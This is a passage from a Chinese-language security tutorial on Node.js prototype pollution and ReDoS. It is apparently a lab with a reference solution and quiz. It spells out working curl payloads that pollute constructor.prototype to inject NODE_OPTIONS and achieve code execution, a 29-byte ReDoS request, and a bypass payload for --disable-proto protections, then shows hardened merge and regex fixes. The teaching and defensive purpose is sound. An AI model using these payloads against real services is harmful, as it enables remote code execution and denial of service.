echo 'require("fs").writeFileSync("/tmp/pp_rce_ok", String(process.pid));' > /tmp/poc_probe.js
rm -f /tmp/pp_rce_ok
```

接著對設定更新端點打出 `constructor.prototype` 汙染請求（這條路徑就算伺服器開了 `--disable-proto=throw` 也照樣能穿過）：

```bash
curl -s -X POST http://127.0.0.1:13000/api/v1/webhook/config \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"shell":"/bin/sh","env":{"NODE_OPTIONS":"--require /tmp/poc_probe.js"}}}}'
```

最後，像個普通監控系統一樣去呼叫健康檢查端點，並查看 `/tmp/pp_rce_ok` 是否被成功建出：

```bash
curl -s http://127.0.0.1:13000/api/v1/health/diag
cat /tmp/pp_rce_ok   # 成功印出子行程 PID，證明隔空 RCE 成立！
```

（小提醒：測完這一步記得先把 `server.js` 關掉重開，把已經被弄髒的全域 `Object.prototype` 清乾淨。）

#### 2. 任務 B：送出 `29 bytes` 觸發 ReDoS 釘死 Event Loop

```bash
node -e '
const payload = JSON.stringify({ eventName: "a".repeat(28) + "!" });
fetch("http://127.0.0.1:13000/api/v1/webhook/verify", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: payload
}).then(r => r.json()).then(console.log);
'
```

在一般開發筆電上跑這行指令，回傳的 `elapsedMs` 通常會落在 **`2,000 ms` 到 `8,000 ms`** 之間（視你的 CPU 單核時脈而定，完全吻合我們前面 Worked Example 推導的 `2^28 ≈ 2.68 × 10^8` 步、約 `5.37 秒` 基準模型）。在這幾秒鐘內，你在別的終端機打 `curl http://127.0.0.1:13000/api/v1/health/diag` 會發現請求完全卡住不動，直到那 `2.68 億` 次回溯算完才終於吐出回應。

#### 3. 任務 C：完整修補程式碼

把 `server.js` 裡的 `deepMerge` 與 `unsafeEventRegex` 替換成下面這段加固版本，並改用 `node --disable-proto=throw server.js` 啟動：

```javascript
const RE2 = require("re2");

// 修補 1：改用 Google RE2 線性時間引擎，徹底消滅指數級回溯
const safeEventRegex = new RE2("^(a+)+$");

// 修補 2：明確攔截三個原型鏈關鍵字、檢查自有屬性，並用 Object.create(null) 建立無原型子容器
const FORBIDDEN_KEYS = new Set(["__proto__", "constructor", "prototype"]);

function safeDeepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (!Object.hasOwn(source, key) || FORBIDDEN_KEYS.has(key)) continue;
    const val = source[key];
    if (val !== null && typeof val === "object" && !Array.isArray(val)) {
      if (
        !Object.hasOwn(target, key) ||
        target[key] === null ||
        typeof target[key] !== "object" ||
        Array.isArray(target[key])
      ) {
        target[key] = Object.create(null);
      }
      safeDeepMerge(target[key], val);
    } else {
      target[key] = val;
    }
  }
  return target;
}
```

同時在 `/api/v1/webhook/verify` 路由入口補上長度閘門：`if (typeof eventName !== "string" || Buffer.byteLength(eventName, "utf8") > 128) return res.writeHead(400).end();`。
換上修補版後重跑一次任務 B 的 `29 bytes` ReDoS 攻擊，你會看到 `RE2` 的 `elapsedMs` 直接從幾千毫秒暴跌回 **`< 1 ms`**（次毫秒級）；再重跑任務 A 的原型鏈汙染，`/tmp/pp_rce_ok` 也再也不會被建立出來了。

---

## 自我檢核

- **難度**：入門
- **預估時間**：20 分鐘

別看上方的參考解答，試著回答下面這四道面試與架構審查最愛考的觀念題：

1. 為什麼單獨執行 `const obj = JSON.parse('{"__proto__": {"polluted": true}}')` 時，`({}).polluted` 依然是 `undefined`（全域原型根本沒被汙染）；但只要多做一步 `deepMerge(target, obj)`，全域的 `Object.prototype.polluted` 就突然變成 `true` 了？
2. 某資安團隊在 Dockerfile 啟動命令加上了 `node --disable-proto=throw app.js`，還在程式碼的 `merge` 函式裡加上了 `if (key === "__proto__") return;`。請問這兩道防線加在一起夠安全嗎？如果還不夠，請直接寫出能一招打穿它的 JSON Payload 並說明原因。
3. 回想一下本章 Worked Example 裡對 `^(a+)+$` 的 $2^n$ 步數估算模型：當攻擊者傳入 `n = 28` 個 `'a'` 加上 `'!'` 時，模型回溯步數是 $2^{28} \approx 2.68 \times 10^8$ 步，在 $5 \times 10^7\text{ steps/s}$ 的基準吞吐量下大約會把 Event Loop 卡死 `5.37 秒`。如果攻擊者只是多敲了兩個字元，把 `'a'` 的數量從 `n = 28` 增加到 `n = 30`，請問回溯步數跟阻塞時間會變成原本的幾倍？大約會卡死幾秒？
4. 當後端呼叫 `child_process.spawn("node", args, {})` 而沒有在第三個參數明確傳入 `env` 屬性時，為什麼攻擊者汙染 `Object.prototype.env = { NODE_OPTIONS: "--require /tmp/evil.js" }` 可以成功把環境變數塞進子行程，但如果只是單純汙染 `Object.prototype.NODE_OPTIONS = "--require /tmp/evil.js"` 卻往往沒辦法生效？

---

### 參考解答

1. **`JSON.parse` 與 `deepMerge` 讀寫 `__proto__` 的差異**：
   - `JSON.parse()` 在解析字串時，只會把 `"__proto__"` 當成一個普通的字串鍵名，在新生成的物件上建立一個**真的叫做 `"__proto__"` 的自有資料屬性（own data property）**，並不會去觸發 `Object.prototype.__proto__` 的 setter，所以單獨 `JSON.parse` 時全域原型完好無損。
   - 但當 `deepMerge(target, obj)` 用 `Object.keys(obj)` 取出 `'__proto__'` 這個鍵，轉頭去讀取 `target['__proto__']` 準備往下遞迴時，因為 `target` 本身沒有名為 `'__proto__'` 的自有屬性，V8 就會順著原型鏈呼叫 `Object.prototype.__proto__` 的 **getter**，拿到的回傳值正是全域共享的 `Object.prototype` 本體！接著下一層遞迴執行 `target['polluted'] = true` 時，就一刀直接寫進了 `Object.prototype` 裡。
2. **繞過 `--disable-proto=throw` 與 `__proto__` 黑名單的 Payload**：
   - 完全不夠安全。只要送出這包 JSON 就能一招打穿：
     `{"constructor": {"prototype": {"isAdmin": true}}}`
   - **原因**：無論是 `--disable-proto=throw` 啟動參數還是 `key === "__proto__"` 黑名單，都只盯著 `__proto__` 這一個名稱。但對普通物件 `target` 來說，讀取 `target["constructor"]` 會順著原型鏈合法拿到 `Object` 建構函式，再往下讀 `Object["prototype"]` 一樣能拿到全域的 `Object.prototype` 本體，從頭到尾都不會觸發 `ERR_PROTO_ACCESS`。
3. **從 `n = 28` 加到 `n = 30` 的指數放大倍數與阻塞秒數**：
   - 在步數為 $2^n$ 且單步吞吐量固定的模型下，$n$ 每增加 $2$，總回溯步數就會放大 $2^2 = 4$ 倍（從 $2^{28}$ 變成 $2^{30} = 1,073,741,824 \approx 1.07 \times 10^9$ 步，破十億步）。
   - 以同樣的 $5 \times 10^7\text{ steps/s}$ 基準吞吐量換算，Event Loop 的單次同步阻塞時間也會跟著放大 **4 倍**，從原本的約 `5.37 秒` 暴增到約 **`21.47 秒`**！僅僅多塞 `2 bytes`，阻塞時間就翻了四倍，這正是指數級複雜度 $O(2^n)$ 的恐怖之處。
4. **為什麼要汙染 `Object.prototype.env` 而不是 `Object.prototype.NODE_OPTIONS`**：
   - 在 Node.js `child_process` 的參數正規化邏輯裡，決定子行程環境變數的寫法是 `const env = options.env || process.env;`。
   - 當呼叫端傳入空物件 `{}` 時，如果 `Object.prototype.env` 沒被汙染，`options.env` 就會是 `undefined`，程式於是回退去拿預設的 `process.env`（而 `process.env` 底層是特殊的 C++ 原生環境變數代理物件，打包環境變數時不會去爬 JS 的 `Object.prototype.NODE_OPTIONS`）。
   - 反過來，當攻擊者直接汙染了 `Object.prototype.env = { NODE_OPTIONS: "..." }`，那 `options.env` 順著原型鏈讀出來的就是一個為真值（truthy）的普通 JS 物件，當場把後面的 `process.env` 給整包換掉，子行程啟動時就會乖乖照著攻擊者給的 `NODE_OPTIONS` 載入惡意模組。

---

## 延伸閱讀

- Node.js 官方安全指南：*Security Best Practices — Prototype Pollution & `--disable-proto`*（https://nodejs.org/en/learn/getting-started/security-best-practices）
- PortSwigger Research（Gareth Heyes）：*Server-side prototype pollution: Black-box detection without the DoS*（https://portswigger.net/research/server-side-prototype-pollution）— 必讀的無損黑箱探測技巧與 Node.js RCE Gadget 大全。
- Olivier Arteau：*Prototype pollution attack in NodeJS application* — 奠定現代 JavaScript 原型鏈汙染分類與 `lodash` / `hoek` 經典案例的開山研究。
- Russ Cox：*Regular Expression Matching Can Be Simple And Fast*（https://swtch.com/~rsc/regexp/regexp1.html）— 清楚對比為什麼回溯型 NFA 會在 `^(a+)+$` 上退化成 $O(2^n)$，而 Thompson NFA / Google RE2 卻能輕鬆維持 $O(n)$ 線性時間。
- `js-yaml` v4.0.0 Release Notes 與安全公告 — 了解 `yaml.load()` 為什麼在 4.0 之後全面移除 `!!js/function` 預設支援與 Schema 隔離設計。
